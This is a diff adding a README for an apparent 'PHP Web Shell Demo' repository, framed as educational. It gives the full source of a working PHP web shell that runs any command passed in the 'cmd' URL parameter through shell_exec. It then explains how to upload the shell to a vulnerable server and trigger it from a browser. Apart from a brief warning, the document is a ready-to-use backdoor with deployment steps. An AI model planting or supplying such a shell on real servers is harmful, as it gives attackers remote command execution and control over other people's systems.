@@ -1,0 +1,25 @@
+# PHP Web Shell Demo
+
+This repository contains a simple PHP web shell script for educational purposes.
+
+**Warning**: This script allows remote code execution on a vulnerable server. Please use it only in controlled, safe environments like CTF challenges or on local servers that you own.
+
+## How to Use
+1. create php file contain: 
+*****************************
+```<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo "<pre>";
+    echo shell_exec($cmd);
+    echo "</pre>";
+}
+?>
+```
+
+****************************
+2. Upload the `webshell.php` file to a vulnerable server that allows PHP file uploads.
+3. Access the file via your browser:
+http://example.com/webshell.php?cmd=ls
+
+
